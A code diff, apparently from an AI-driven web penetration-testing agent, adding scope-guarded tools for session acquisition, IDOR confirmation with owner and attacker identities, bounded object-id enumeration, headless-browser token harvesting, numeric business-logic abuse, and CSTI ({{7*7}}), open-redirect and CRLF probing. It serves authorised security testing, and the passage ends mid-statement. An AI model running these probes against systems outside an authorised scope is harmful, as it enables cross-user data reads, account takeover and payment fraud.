+            body = _poc.redact(body) if hasattr(_poc, "redact") else body
+        except Exception:
+            pass
+        return {"status": r.status_code if r is not None else 0,
+                "length": len(r.text) if r is not None else 0,
+                "elapsed_ms": int(elapsed * 1000),
+                "headers": hdrs, "body": body,
+                "truncated": bool(r is not None and len(r.text) > self._RESP_CAP)}
+
+    async def _http_send(self, method: str, url: str, headers: dict, body, follow: bool):
+        import time
+        import httpx
+        h = {"User-Agent": _UA, **(self.session_headers or {}), **(headers or {})}
+        t0 = time.perf_counter()
+        async with httpx.AsyncClient(verify=False, follow_redirects=follow, headers=h, timeout=20) as c:
+            content = None
+            if body is not None:
+                content = body if isinstance(body, (bytes, str)) else json.dumps(body)
+            r = await c.request(method, url, content=content if isinstance(content, (bytes, str)) else None)
+            self._harvest_response(url, r)
+            return r, time.perf_counter() - t0
+
+    def _harvest_body(self, source: str, headers, body) -> None:
+        """Route a fetched body into the target-intel store by content-type. Shared by the
+        investigative transport (_http_send) AND the deterministic fetch helper (_http), so a
+        plain deterministic scan fills the intel store too. Best-effort; never raises."""
+        try:
+            try:
+                ct = (headers.get("content-type") or "").lower()
+            except Exception:
+                ct = ""
+            body = (body or "")[:200000]
+            u = (source or "").split("?")[0]
+            material = {"source": source, "headers": headers}
+            if "json" in ct:
+                material["json"] = body
+            elif "javascript" in ct or "ecmascript" in ct or u.endswith(".js"):
+                material["js"] = body
+            else:
+                material["text"] = body
+            self._intel_mod.harvest(material, self.intel)
+        except Exception:
+            pass
+
+    def _harvest_response(self, url: str, r) -> None:
+        """Harvest an httpx Response (investigative-transport path)."""
+        try:
+            self._harvest_body(url, r.headers, r.text)
+        except Exception:
+            pass
+
+    def _resolve_headers(self, inp: dict) -> dict:
+        """Merge explicit headers with a named acquired session (inp['session'] → role).
+        The session's real token is injected here and NEVER returned to the model."""
+        h = dict(inp.get("headers") or {})
+        role = inp.get("session")
+        if role and role in self._sessions:
+            h = {**self._sessions[role], **h}
+        return h
+
+    async def _acquire_session(self, inp: dict) -> ToolResult:
+        """ACTIVE: authenticate ONCE with a supplied credential and store the session under a
+        role name for reuse (pass session=<role> to the investigative primitives). This is
+        authorized authentication with a single credential pair the agent already holds — NOT
+        credential brute-force: it is hard-capped per mission and never iterates a password
+        list. The token is stored server-side and is never exposed to the model."""
+        import httpx
+        url = (inp.get("login_url") or inp.get("url") or "").strip()
+        user = inp.get("username") or inp.get("email") or ""
+        pw = inp.get("password") or ""
+        role = inp.get("role") or "default"
+        self._login_attempts += 1
+        if self._login_attempts > 8:
+            return ToolResult("acquire_session", url, False, "", [],
+                              "login attempt cap reached (anti-brute-force): acquire_session does not iterate credentials")
+        if not url or not self.scope.validate(url)[0]:
+            return ToolResult("acquire_session", url, False, "", [], "SCOPE BLOCK: off-scope login URL")
+        auth_header, identity = None, None
+        # 1) JSON API login (SPA / REST)
+        try:
+            async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=15,
+                                         headers={"User-Agent": _UA}) as c:
+                for body in ({"email": user, "password": pw}, {"username": user, "password": pw}):
+                    try:
+                        r = await c.post(url, json=body)
+                    except Exception:
+                        continue
+                    if r.status_code in (200, 201):
+                        try:
+                            j = r.json()
+                        except Exception:
+                            j = {}
+                        tok = ((j.get("authentication") or {}).get("token") or j.get("token")
+                               or j.get("access_token") or j.get("jwt") or j.get("id_token"))
+                        if tok:
+                            auth_header = {"Authorization": "Bearer " + tok}
+                            identity = (j.get("authentication") or {}).get("umail") or user
+                            break
+                        ck = "; ".join(f"{k}={v}" for k, v in c.cookies.items())
+                        if ck:
+                            auth_header = {"Cookie": ck}; identity = user; break
+        except Exception:
+            pass
+        # 2) fallback: form login
+        if not auth_header:
+            import auth
+            res = await auth.login(url, user, pw)
+            if res.get("headers"):
+                auth_header, identity = res["headers"], user
+        if not auth_header:
+            return ToolResult("acquire_session", url, True,
+                              json.dumps({"acquired": False, "role": role, "note": "login did not yield a session"}), [])
+        self._sessions[role] = auth_header
+        kind = "bearer" if "Authorization" in auth_header else "cookie"
+        self.state.add_identity(role, {"auth_type": kind, "identity": identity,
+                                       "is_admin": bool(identity and "admin" in str(identity).lower())})
+        return ToolResult("acquire_session", url, True,
+                          json.dumps({"acquired": True, "role": role, "auth_type": kind, "identity": identity,
+                                      "usage": f'pass session="{role}" to http_read / http_diff / confirm_idor / enumerate_ids'}),
+                          [])
+
+    async def _http_read(self, inp: dict) -> ToolResult:
+        """ACTIVE: send a scope-guarded SAFE-method request (GET/HEAD/OPTIONS) with custom
+        headers (e.g. an Authorization token) and return the response to the model. The
+        read atom of investigation — IDOR/BOLA reads, JWT-accept checks, enumeration."""
+        method = (inp.get("method") or "GET").upper()
+        url = (inp.get("url") or "").strip()
+        if method not in self._SAFE_METHODS:
+            return ToolResult("http_read", url, False, "", [],
+                              f"http_read is read-only ({'/'.join(self._SAFE_METHODS)}); use http_request for {method}")
+        if not self.scope.validate(url)[0]:
+            return ToolResult("http_read", url, False, "", [], "SCOPE BLOCK: off-scope URL")
+        try:
+            r, el = await self._http_send(method, url, self._resolve_headers(inp), None, bool(inp.get("follow", True)))
+        except Exception as e:
+            return ToolResult("http_read", url, False, "", [], f"request failed: {e}")
+        view = self._shape_response(r, el)
+        return ToolResult("http_read", url, True,
+                          json.dumps({"method": method, "url": url, **view}), [])
+
+    async def _http_request(self, inp: dict) -> ToolResult:
+        """INTRUSIVE: send a scope-guarded request with ANY method + body (state-changing).
+        Rides the HITL gate (INTRUSIVE). The write atom of investigation — object
+        manipulation, forged-token POSTs, business-rule violations. Confirmation is still
+        a deterministic diff, not this call's say-so."""
+        method = (inp.get("method") or "POST").upper()
+        url = (inp.get("url") or "").strip()
+        if not self.scope.validate(url)[0]:
+            return ToolResult("http_request", url, False, "", [], "SCOPE BLOCK: off-scope URL")
+        try:
+            r, el = await self._http_send(method, url, self._resolve_headers(inp),
+                                          inp.get("body"), bool(inp.get("follow", True)))
+        except Exception as e:
+            return ToolResult("http_request", url, False, "", [], f"request failed: {e}")
+        view = self._shape_response(r, el)
+        return ToolResult("http_request", url, True,
+                          json.dumps({"method": method, "url": url, **view}), [])
+
+    async def _http_diff(self, inp: dict) -> ToolResult:
+        """ACTIVE: send two SAFE-method requests and return a DETERMINISTIC differential —
+        the confirmation-oracle substrate. status match, length delta, and body similarity
+        let the model (and truth-first checks) decide vulnerable vs safe vs inconclusive
+        without guessing. E.g. IDOR: request self-object vs other-object and compare."""
+        import difflib
+        a, b = inp.get("a") or {}, inp.get("b") or {}
+        for spec in (a, b):
+            if (spec.get("method") or "GET").upper() not in self._SAFE_METHODS:
+                return ToolResult("http_diff", "", False, "", [], "http_diff is read-only; use http_request for writes")
+            if not self.scope.validate((spec.get("url") or "").strip())[0]:
+                return ToolResult("http_diff", spec.get("url", ""), False, "", [], "SCOPE BLOCK: off-scope URL")
+        try:
+            ra, _ = await self._http_send("GET", a["url"], self._resolve_headers(a), None, True)
+            rb, _ = await self._http_send("GET", b["url"], self._resolve_headers(b), None, True)
+        except Exception as e:
+            return ToolResult("http_diff", "", False, "", [], f"request failed: {e}")
+        sim = difflib.SequenceMatcher(None, ra.text[:8000], rb.text[:8000]).ratio()
+        out = {"a": {"url": a["url"], "status": ra.status_code, "length": len(ra.text)},
+               "b": {"url": b["url"], "status": rb.status_code, "length": len(rb.text)},
+               "same_status": ra.status_code == rb.status_code,
+               "length_delta": abs(len(ra.text) - len(rb.text)),
+               "body_similarity": round(sim, 3),
+               # interpretation aid (still deterministic): two 200s with distinct bodies
+               # on an object endpoint is the IDOR signature; the model confirms with context.
+               "distinct_objects": ra.status_code == 200 and rb.status_code == 200 and sim < 0.98}
+        return ToolResult("http_diff", a.get("url", ""), True, json.dumps(out), [])
+
+    def _role_headers(self, inp: dict, prefix: str) -> dict:
+        """Resolve headers for a named role: {prefix}_session (from acquire_session) merged
+        with {prefix}_headers. Used to test an object across TWO identities."""
+        h = dict(inp.get(prefix + "_headers") or {})
+        role = inp.get(prefix + "_session")
+        if role and role in self._sessions:
+            h = {**self._sessions[role], **h}
+        return h
+
+    async def _confirm_idor(self, inp: dict) -> ToolResult:
+        """ACTIVE oracle-helper for IDOR/BOLA. Ownership is only proven with TWO identities:
+        the OWNER (who legitimately holds the object) and the ATTACKER (a different identity).
+        A CONFIRMED finding is produced only when the attacker reads the SAME object the owner
+        sees (high response similarity, both 200) — that is genuine cross-user access. With
+        only ONE identity the tool cannot prove ownership, so it emits a LEAD, never a
+        confirmed finding (this is the fix for over-confirming on two distinct 200s)."""
+        import difflib
+        target = (inp.get("target_url") or "").strip()
+        if not target:
+            return ToolResult("confirm_idor", "", False, "", [], "target_url required")
+        if not self.scope.validate(target)[0]:
+            return ToolResult("confirm_idor", target, False, "", [], "SCOPE BLOCK: off-scope URL")
+        owner_h = self._role_headers(inp, "owner")
+        attacker_h = self._role_headers(inp, "attacker")
+
+        # ── strong path: two distinct identities ──
+        if owner_h and attacker_h:
+            try:
+                ro, _ = await self._http_send("GET", target, owner_h, None, True)
+                ra, _ = await self._http_send("GET", target, attacker_h, None, True)
+            except Exception as e:
+                return ToolResult("confirm_idor", target, False, "", [], f"request failed: {e}")
+            sim = difflib.SequenceMatcher(None, ro.text[:8000], ra.text[:8000]).ratio()
+            confirmed = (ro.status_code == 200 and ra.status_code == 200 and len(ra.text) > 2 and sim >= 0.9)
+            detail = {"mode": "two-identity", "confirmed": confirmed, "owner_status": ro.status_code,
+                      "attacker_status": ra.status_code, "owner_attacker_similarity": round(sim, 3)}
+            if not confirmed:
+                return ToolResult("confirm_idor", target, True, json.dumps(detail), [])
+            f = {"title": "IDOR / BOLA — cross-user object access confirmed", "severity": "high",
+                 "target": target, "family": "idor", "cwe": "CWE-639", "confidence": "confirmed",
+                 "tags": ["idor", "bola", "access-control"],
+                 "description": ("An object owned by one user was read by a DIFFERENT authenticated user. The object "
+                                 "identifier is not authorization-checked, so any user can read another user's records."),
+                 "impact": "Read other users' data (PII, orders, baskets); bulk exfiltration by walking the id space.",
+                 "reproduction_steps": [f"As the owner, GET {target} → 200 (owner's object)",
+                                        f"As a DIFFERENT user, GET {target} → 200 with the SAME object "
+                                        f"(response similarity {round(sim, 3)}) — cross-user read"],
+                 "evidence": (f"owner GET {target} -> {ro.status_code} ({len(ro.text)}b)\n"
+                              f"attacker (different identity) GET {target} -> {ra.status_code} ({len(ra.text)}b); "
+                              f"owner/attacker similarity {round(sim, 3)} (>=0.9 = same object)")}
+            self.state.add_capability(self._Capability.FOREIGN_OBJECT_READ, f"cross-user read of {target}")
+            self.state.add_object(target, owner_role="owner", status=200)
+            return ToolResult("confirm_idor", target, True, json.dumps(detail), [f])
+
+        # ── weak path: one identity → LEAD only (cannot prove ownership) ──
+        owned = (inp.get("owned_url") or "").strip()
+        headers = self._resolve_headers(inp) or owner_h or attacker_h
+        if not owned:
+            return ToolResult("confirm_idor", target, True,
+                              json.dumps({"mode": "single-identity", "confirmed": False,
+                                          "note": "provide owner_session + attacker_session to CONFIRM cross-user "
+                                                  "access; with owned_url only, a single-identity heuristic emits a lead"}),
+                              [])
+        control = re.sub(r"/(\d+)(\D*)$", lambda m: "/99999999" + (m.group(2) or ""), target)
+        try:
+            ro, _ = await self._http_send("GET", owned, headers, None, True)
+            rt, _ = await self._http_send("GET", target, headers, None, True)
+            rc, _ = (await self._http_send("GET", control, headers, None, True)) if control != target else (rt, 0)
+        except Exception as e:
+            return ToolResult("confirm_idor", target, False, "", [], f"request failed: {e}")
+        sim_ot = difflib.SequenceMatcher(None, ro.text[:8000], rt.text[:8000]).ratio()
+        sim_tc = difflib.SequenceMatcher(None, rt.text[:8000], rc.text[:8000]).ratio()
+        signal = (rt.status_code == 200 and ro.status_code == 200 and len(rt.text) > 2
+                  and sim_ot < 0.98 and (rc.status_code >= 400 or sim_tc < 0.95))
+        detail = {"mode": "single-identity", "confirmed": False, "idor_signal": signal,
+                  "owned_status": ro.status_code, "target_status": rt.status_code,
+                  "owned_target_similarity": round(sim_ot, 3)}
+        leads = []
+        if signal:
+            leads.append({"title": "Possible IDOR/BOLA — object id not access-checked (single-identity signal)",
+                          "severity": "medium", "target": target, "family": "idor", "confidence": "lead",
+                          "cwe": "CWE-639", "tags": ["idor", "bola", "access-control"],
+                          "description": ("One session read two distinct objects by changing the id. This is an IDOR "
+                                          "SIGNAL, not proof of ownership — CONFIRM by reading the target as a DIFFERENT "
+                                          "user (owner_session + attacker_session)."),
+                          "evidence": f"owned {owned} -> {ro.status_code}; target {target} -> {rt.status_code}; "
+                                      f"similarity {round(sim_ot, 3)}; control {control} -> "
+                                      f"{rc.status_code if control != target else 'n/a'}"})
+        return ToolResult("confirm_idor", target, True, json.dumps(detail), leads)
+
+    async def _run_enumerate_ids(self, inp: dict) -> ToolResult:
+        """INTRUSIVE: bounded object-id enumeration on a templated URL — the IDOR-at-scale
+        primitive. DECLARATIVE recipe only (no code from the model): a url containing {id}, a
+        numeric range (hard-capped), optional session headers. Returns the ids whose response
+        is a distinct populated 200 (vs a nonexistent-id baseline). Emits a LEAD, not a
+        confirmed finding — use confirm_idor to prove ownership. Scope-guarded per request."""
+        import difflib
+        tmpl = (inp.get("url_template") or inp.get("url") or "").strip()
+        headers = self._resolve_headers(inp)
+        if "{id}" not in tmpl:
+            return ToolResult("enumerate_ids", tmpl, False, "", [], "url_template must contain {id}")
+        if not self.scope.validate(tmpl.replace("{id}", "1"))[0]:
+            return ToolResult("enumerate_ids", tmpl, False, "", [], "SCOPE BLOCK: off-scope URL")
+        lo = max(0, int(inp.get("start", 1)))
+        hi = min(int(inp.get("end", lo + 20)), lo + 50)   # hard request cap
+        try:
+            rbase, _ = await self._http_send("GET", tmpl.replace("{id}", "99999999"), headers, None, True)
+        except Exception:
+            rbase = None
+        accessible = []
+        for i in range(lo, hi + 1):
+            u = tmpl.replace("{id}", str(i))
+            if not self.scope.validate(u)[0]:
+                continue
+            try:
+                r, _ = await self._http_send("GET", u, headers, None, True)
+            except Exception:
+                continue
+            if r.status_code == 200 and len(r.text) > 2:
+                distinct = (rbase is None or r.status_code != rbase.status_code
+                            or difflib.SequenceMatcher(None, r.text[:4000], (rbase.text[:4000] if rbase else "")).ratio() < 0.95)
+                if distinct:
+                    accessible.append(i)
+        out = {"template": tmpl, "range": [lo, hi], "accessible_ids": accessible[:100], "count": len(accessible)}
+        leads = []
+        if len(accessible) >= 2:
+            leads.append({"title": f"Enumerable objects by id ({len(accessible)} in {lo}..{hi})", "severity": "medium",
+                          "target": tmpl, "family": "idor", "confidence": "lead",
+                          "tags": ["idor", "enumeration", "bola"],
+                          "description": ("Sequential object ids return distinct populated records. If these belong to "
+                                          "other users this is a bulk IDOR — confirm ownership with confirm_idor."),
+                          "evidence": f"accessible ids: {accessible[:30]}"})
+        return ToolResult("enumerate_ids", tmpl, True, json.dumps(out), leads)
+
+    async def _browser_navigate(self, inp: dict) -> ToolResult:
+        """ACTIVE: drive a real headless browser through a DECLARATIVE step list (goto / click /
+        fill / press / wait — NEVER arbitrary JS from the model) and capture what a DevTools
+        session would show: the final URL, the visible DOM text, localStorage/sessionStorage,
+        the XHR/fetch API calls the page made, and the loaded scripts. This is how the agent
+        drives authenticated single-page-app flows (log in via the UI, then act) and inspects
+        client-side state. Every navigation is scope-validated; a step that lands off-scope
+        stops the flow. Secret VALUES in web storage are redacted from what the model sees, but
+        an exposed token is reported as a finding. Degrades gracefully if Chromium is absent."""
+        steps = inp.get("steps") or []
+        start = (inp.get("url") or "").strip()
+        chrome = _chrome_path()
+        if not chrome:
+            return ToolResult("browser_navigate", start, False, "", [],
+                              "headless browser unavailable (Chromium/Playwright not installed) — use http_read/http_request")
+        if start and not self.scope.validate(start)[0]:
+            return ToolResult("browser_navigate", start, False, "", [], "SCOPE BLOCK: off-scope URL")
+        hdrs = self._resolve_headers(inp)
+        api_calls, step_log, findings = [], [], []
+        try:
+            from playwright.async_api import async_playwright
+            os.environ.setdefault("PLAYWRIGHT_SKIP_BROWSER_DOWNLOAD", "1")
+            async with async_playwright() as pw:
+                browser = await pw.chromium.launch(headless=True, executable_path=chrome,
+                                                   args=["--no-sandbox", "--disable-gpu", "--disable-dev-shm-usage"])
+                ctx = await browser.new_context(ignore_https_errors=True)
+                if hdrs:
+                    try:
+                        await ctx.set_extra_http_headers({k: str(v) for k, v in hdrs.items()})
+                    except Exception:
+                        pass
+                page = await ctx.new_page()
+                page.on("request", lambda r: api_calls.append(r.method + " " + r.url)
+                        if r.resource_type in ("xhr", "fetch") else None)
+
+                async def _nav(u):
+                    if not u or not self.scope.validate(u)[0]:
+                        step_log.append({"goto": u, "error": "off-scope, skipped"})
+                        return
+                    await page.goto(u, wait_until="domcontentloaded", timeout=12000)
+                    step_log.append({"goto": u})
+
+                if start:
+                    await _nav(start)
+                for st in steps[:20]:
+                    act = (st.get("action") or "").lower()
+                    try:
+                        if act == "goto":
+                            await _nav(st.get("url", ""))
+                        elif act == "click":
+                            await page.click(st["selector"], timeout=5000); step_log.append({"click": st["selector"]})
+                        elif act == "fill":
+                            await page.fill(st["selector"], str(st.get("value", ""))); step_log.append({"fill": st["selector"]})
+                        elif act == "press":
+                            await page.press(st.get("selector", "body"), st.get("key", "Enter")); step_log.append({"press": st.get("key")})
+                        elif act == "wait":
+                            await page.wait_for_timeout(min(int(st.get("ms", 800)), 5000)); step_log.append({"wait": st.get("ms", 800)})
+                        else:
+                            step_log.append({"unknown_action": act})
+                        cur = page.url
+                        if cur and not self.scope.validate(cur)[0]:
+                            step_log.append({"navigated_off_scope": cur, "action": "stopped"})
+                            break
+                    except Exception as e:
+                        step_log.append({"action": act, "error": str(e)[:120]})
+                final_url = page.url
+                try:
+                    dom = (await page.evaluate("document.body ? document.body.innerText : ''"))[:3000]
+                except Exception:
+                    dom = ""
+                try:
+                    storage = await page.evaluate(
+                        "({local:Object.fromEntries(Object.entries(localStorage)),"
+                        " session:Object.fromEntries(Object.entries(sessionStorage))})")
+                except Exception:
+                    storage = {"local": {}, "session": {}}
+                try:
+                    scripts = await page.evaluate("Array.from(document.scripts).map(s=>s.src).filter(Boolean).slice(0,50)")
+                except Exception:
+                    scripts = []
+                try:
+                    cookies = await ctx.cookies()
+                except Exception:
+                    cookies = []
+                await browser.close()
+        except Exception as e:
+            return ToolResult("browser_navigate", start, False, "", [], f"browser error: {str(e)[:160]}")
+        # redact secret VALUES from web storage (keep keys) and flag exposed tokens
+        red, exposed = {}, []
+        for realm, bag in (("local", storage.get("local", {})), ("session", storage.get("session", {}))):
+            for k, v in (bag or {}).items():
+                vv = str(v)
+                is_jwt = vv[:3] == "eyJ" and vv.count(".") == 2
+                is_secret = is_jwt or any(h in k.lower() for h in ("token", "auth", "secret", "key", "session", "jwt", "password"))
+                red[f"{realm}.{k}"] = ("<redacted " + ("jwt" if is_jwt else "secret") + ">") if is_secret else vv[:120]
+                if is_secret:
+                    exposed.append(f"{realm}Storage.{k}" + (" (JWT)" if is_jwt else ""))
+        if exposed:
+            findings.append({"title": "Session token stored in browser web storage", "severity": "low",
+                             "target": final_url, "family": "exposure", "confidence": "lead",
+                             "cwe": "CWE-522", "tags": ["web-storage", "token", "xss-impact"],
+                             "description": ("A session token/secret is held in localStorage/sessionStorage, which any "
+                                             "JavaScript on the page can read — so an XSS becomes full session theft. An "
+                                             "httpOnly cookie avoids this."),
+                             "evidence": "exposed keys: " + ", ".join(exposed[:10])})
+        in_scope_apis = sorted({a for a in api_calls if self.scope.validate(a.split(" ", 1)[-1])[0]})
+        self._add_urls([a.split(" ", 1)[-1] for a in in_scope_apis])   # seed discovered APIs into the surface
+        # promote-to-session: turn a browser login into a named HTTP session so the request
+        # primitives inherit browser-acquired auth (JWT in storage → Bearer; else cookies).
+        promoted = None
+        if inp.get("promote_session"):
+            role = inp["promote_session"]
+            tok = None
+            for bag in (storage.get("local", {}), storage.get("session", {})):
+                for v in (bag or {}).values():
+                    vv = str(v)
+                    if vv[:3] == "eyJ" and vv.count(".") == 2:
+                        tok = vv
+                        break
+                if tok:
+                    break
+            if tok:
+                self._sessions[role] = {"Authorization": "Bearer " + tok}
+            elif cookies:
+                ck = "; ".join(f"{c['name']}={c['value']}" for c in cookies if c.get('name'))
+                if ck:
+                    self._sessions[role] = {"Cookie": ck}
+            if role in self._sessions:
+                self.state.add_identity(role, {"auth_type": "bearer" if tok else "cookie",
+                                               "identity": "browser:" + role, "is_admin": False})
+                promoted = role
+        out = {"final_url": final_url, "steps_run": step_log, "dom_excerpt": dom[:1500],
+               "web_storage": red, "api_calls_discovered": in_scope_apis[:40], "scripts": scripts[:30],
+               "promoted_session": promoted}
+        return ToolResult("browser_navigate", final_url or start, True, json.dumps(out), findings)
+
+    async def _test_numeric_abuse(self, inp: dict) -> ToolResult:
+        """INTRUSIVE: business-logic boundary testing on a numeric field. Sends a benign
+        control plus out-of-range values (negative / zero / huge / fractional) to a
+        state-changing request and reports which the server ACCEPTS (2xx) that it should
+        reject — the substrate for price/quantity/amount abuse. NEVER finalizes payment or
+        performs an irreversible action; it only probes acceptance. Emits a lead (impact
+        depends on the downstream invariant — verify with a state re-read via http_read)."""
+        url = (inp.get("url") or "").strip()
+        method = (inp.get("method") or "POST").upper()
+        param = inp.get("param") or ""
+        base_body = inp.get("body") if isinstance(inp.get("body"), dict) else {}
+        if not url or not param:
+            return ToolResult("numeric_abuse", url, False, "", [], "url and param required")
+        if not self.scope.validate(url)[0]:
+            return ToolResult("numeric_abuse", url, False, "", [], "SCOPE BLOCK: off-scope URL")
+        headers = {**self._resolve_headers(inp), "Content-Type": "application/json"}
+        control = inp.get("control", 1)
+        values = inp.get("values") or [-1, 0, 999999, 1.5]
+
+        def _set(body, path, val):
+            b = json.loads(json.dumps(body)); node = b
+            parts = path.split(".")
+            for p in parts[:-1]:
+                node = node.setdefault(p, {})
+            node[parts[-1]] = val
+            return b
+
+        async def _send(val):
+            try:
+                r, _ = await self._http_send(method, url, headers, _set(base_body, param, val), True)
+                return r.status_code, r.text[:400]
+            except Exception:
+                return 0, ""
+        cs, _ = await _send(control)
+        accepted = []
+        for v in values[:6]:
+            st, _ = await _send(v)
+            if 200 <= st < 300:                       # server accepted an out-of-range value
+                accepted.append(v)
+        leads = []
+        if accepted:
+            leads.append({"title": f"Business-logic: out-of-range '{param}' accepted", "severity": "medium",
+                          "target": url, "family": "business_logic", "confidence": "lead", "cwe": "CWE-840",
+                          "tags": ["business-logic", "input-validation"],
+                          "description": (f"The server accepted out-of-range values {accepted} for numeric field "
+                                          f"'{param}' (control {control} → {cs}). If this feeds a total/price/limit it "
+                                          "enables fraud (negative totals, free items). Verify the downstream effect."),
+                          "evidence": f"accepted: {accepted}; control {control} -> HTTP {cs}"})
+        return ToolResult("numeric_abuse", url, True,
+                          json.dumps({"param": param, "control_status": cs, "accepted_out_of_range": accepted}), leads)
+
+    async def _mission_state(self, inp: dict) -> ToolResult:
+        """PASSIVE: return the current investigation state — acquired identities, confirmed
+        CAPABILITIES (e.g. database_read, foreign_object_read, admin_session), objects seen,
+        extracted variables, and chaining hints (what each capability unlocks next). Read it
+        to plan the next move and to CHAIN confirmed capabilities into deeper attacks."""
+        return ToolResult("mission_state", "", True, json.dumps(self.state.to_dict()), [])
+
+    async def _mission_intel(self, inp: dict) -> ToolResult:
+        """PASSIVE: return the Target Intelligence harvested from the target's own surface —
+        candidates it leaked (emails, usernames, object-ids, routes, external URLs, decoded
+        blobs, hints) that exploitation can consume as run-time FIXTURES. Derive a value from
+        the target instead of guessing; secrets are redacted before the model sees them."""
+        return ToolResult("mission_intel", "", True,
+                          json.dumps(self.intel.to_dict(redact_secrets=True)), [])
+
+    async def _run_workflow(self, inp: dict) -> ToolResult:
+        """INTRUSIVE: execute a declarative investigation workflow (technique pack) — ordered
+        steps calling the scoped primitives, with safe {var} substitution, response extraction
+        into mission variables, a deterministic oracle assertion, and produced capabilities.
+        No arbitrary code; only the typed step vocabulary. Confirmed findings still come from
+        the confirm_* steps inside it (truth-first). Bounded, scope-guarded per step."""
+        import workflow as _wf
+        wf = inp.get("workflow") if isinstance(inp.get("workflow"), dict) else None
+        if not wf and inp.get("pack"):                 # run a named reusable technique pack
+            import packs
+            p = packs.get(inp["pack"])
+            if not p:
+                return ToolResult("run_workflow", inp["pack"], False, "", [], f"unknown pack '{inp['pack']}'")
+            wf = dict(p); wf["inputs"] = inp.get("inputs") or {}
+        if not wf:
+            wf = inp
+        res = await _wf.run(self, wf)
+        return ToolResult("run_workflow", str(wf.get("id", "")), True, json.dumps(res)[:4000], [])
+
+    async def _list_workflows(self, inp: dict) -> ToolResult:
+        """PASSIVE: list the built-in reusable technique packs and the inputs each needs.
+        Run one with run_workflow{pack:"<id>", inputs:{...}} — general across targets."""
+        import packs
+        return ToolResult("list_workflows", "", True, json.dumps(packs.list_packs()), [])
+
+    async def _benchmark_lab(self, inp: dict) -> ToolResult:
+        """ACTIVE (lab-only, SEPARATE from detection): score coverage against a known lab's
+        completion oracle (juiceshop / dvwa). Auto-detects the lab from the page if not
+        given. For benchmark measurement — never hardcoded into scanners."""
+        import labs
+        base = (inp.get("base_url") or inp.get("url") or "").strip()
+        if not base or not self.scope.validate(base)[0]:
+            return ToolResult("benchmark_lab", base, False, "", [], "SCOPE BLOCK or missing base_url")
+        lab = inp.get("lab")
+        if not lab:
+            try:
+                import httpx
+                async with httpx.AsyncClient(verify=False, timeout=10, headers={"User-Agent": _UA}) as c:
+                    html = (await c.get(base)).text
+                lab = labs.detect(html)
+            except Exception:
+                lab = None
+        if not lab:
+            return ToolResult("benchmark_lab", base, True,
+                              json.dumps({"note": "no known lab detected", "available": labs.list_labs()}), [])
+        return ToolResult("benchmark_lab", base, True, json.dumps(labs.benchmark(lab, base)), [])
+
     def _add_urls(self, urls) -> None:
         for u in urls:
             if not u or u in self.urls:
@@ -730,6 +1833,7 @@ class ToolRegistry:
                     text = ""
                 resp = {"status": r.status_code, "headers": dict(r.headers), "body": text,
                         "length": len(r.content), "final_url": str(r.url)}
+                self._harvest_body(resp["final_url"] or url, resp["headers"], text)
         except Exception as e:
             return {"error": str(e), "status": 0, "headers": {}, "body": "", "length": 0, "final_url": url}
 
@@ -1270,6 +2374,14 @@ class ToolRegistry:
         urls = [u.strip() for u in out.splitlines() if u.strip().startswith("http")]
         urls = [u for u in urls if self.scope.validate(u)[0]]
         self._add_urls(urls)
+        try:                                    # crawled URLs are intel: routes + external urls
+            for _u in urls:
+                self.intel.add("url", _u, "katana")
+                _p = urlparse(_u).path
+                if _p and _p != "/":
+                    self.intel.add("route", _p, "katana")
+        except Exception:
+            pass
         note = " (authenticated)" if auth_h else ""
         if intensity != "standard":
             note += f" [{intensity}: depth {depth}]"
@@ -1731,9 +2843,31 @@ class ToolRegistry:
                                 pass
                         page.on("dialog", lambda d: asyncio.ensure_future(on_dialog(d)))
                         page.on("framenavigated", lambda fr: navs.append(fr.url))
+                        # Also record top-level navigation REQUESTS: a real open
+                        # redirect to a non-resolving attacker host (e.g. the reserved
+                        # .example TLD) fires a navigation request but may never commit
+                        # a framenavigated event. confirmed_redirect() host-matches, so
+                        # the probe's own load (attacker host only in the fragment) is
+                        # still excluded — this only adds genuine cross-host navigations.
+                        def _on_request(r):
+                            try:
+                                if r.is_navigation_request():
+                                    navs.append(r.url)
+                            except Exception:
+                                pass
+                        page.on("request", _on_request)
                         try:
-                            await page.goto(probe["nav"], wait_until="load", timeout=8000)
-                            await page.wait_for_timeout(350)
+                            await page.goto(probe["nav"], wait_until="load", timeout=9000)
+                            # CSTI needs the client-side template engine (AngularJS) to bootstrap
+                            # and run a digest before {{7*7}} becomes 49 — wait for network idle.
+                            if probe["class"] == "csti":
+                                try:
+                                    await page.wait_for_load_state("networkidle", timeout=5000)
+                                except Exception:
+                                    pass
+                                await page.wait_for_timeout(900)
+                            else:
+                                await page.wait_for_timeout(350)
                         except Exception:
                             pass
                         pp_value, body = None, ""
@@ -1742,12 +2876,36 @@ class ToolRegistry:
                         except Exception:
                             pass
                         try:
-                            body = await page.evaluate("document.documentElement.innerText")
+                            # read full HTML for CSTI (the evaluated marker can land in markup,
+                            # not just visible text); innerText is enough for the other classes.
+                            body = await page.evaluate(
+                                "document.documentElement.outerHTML" if probe["class"] == "csti"
+                                else "document.documentElement.innerText")
                         except Exception:
                             pass
                         f = dom.build_finding({**probe, "base": url}, pp_value=pp_value,
                                               nav_targets=navs, dialog_msg=fired["msg"], body=body)
                         if f:
+                            # Capture a browser PoC for the report: a viewport screenshot
+                            # (visual proof the bug fired in a real browser) plus a DOM
+                            # snippet around the confirmation marker where one exists
+                            # (e.g. CSTI's evaluated "49<MARK>"). Best-effort, size-capped.
+                            try:
+                                import base64 as _b64
+                                _png = await page.screenshot(type="png", timeout=6000)
+                                _b = _b64.b64encode(_png).decode()
+                                if 0 < len(_b) <= 900000:          # ~675KB raw cap; keep report lean
+                                    f["screenshot"] = "data:image/png;base64," + _b
+                            except Exception:
+                                pass
+                            try:
+                                _snip = await page.evaluate(
+                                    "(m)=>{const h=document.documentElement.outerHTML;const i=h.indexOf(m);"
+                                    "return i<0?'':h.slice(Math.max(0,i-120),i+160);}", "49" + dom.MARK)
+                                if _snip:
+                                    f["dom_snippet"] = _snip
+                            except Exception:
+                                pass
                             findings.append(f)
                             seen_cls.add(probe["class"])
                         try:
@@ -2106,12 +3264,22 @@ class ToolRegistry:
                         cl = await c.get(probe.url, follow_redirects=False)
                         v = ws.analyze_crlf(dict(cl.headers), cl.status_code)
                         if v:
-                            findings.append({"title": f"CRLF / response-header injection on '{probe.parameter}'",
-                                             "severity": v["severity"].lower(), "target": probe.url,
-                                             "description": v["detail"],
-                                             "evidence": f"marker header '{ws.CRLF_MARKER}' surfaced in the response",
-                                             "confidence": "confirmed", "cwe": "CWE-113",
